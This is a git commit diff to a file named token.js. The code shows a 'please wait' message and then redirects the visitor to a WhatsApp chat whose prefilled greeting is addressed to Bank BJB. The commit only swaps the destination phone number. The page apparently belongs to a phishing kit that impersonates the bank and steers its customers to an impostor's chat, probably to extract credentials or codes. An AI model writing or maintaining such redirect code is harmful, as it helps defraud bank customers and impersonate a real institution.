a2c9c811b8e44c4ae5dd3bdd8eb1ac54be486832
bonobaru2 <bonobaru2@gmail.com>
2024-08-28 12:38:22 +0700

    Update token.js

--- token.js
+++ token.js
@@ -48,7 +48,7 @@ audio4.play();
 audio4.loop = false;
 document.getElementById('kirim').innerHTML = "Mohon tunggu sebentar...";
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=6285703139415&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
+location.href='https://api.whatsapp.com/send?phone=6282258090633&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
 $('.load').fadeOut();
     }, 5500);    
 }  
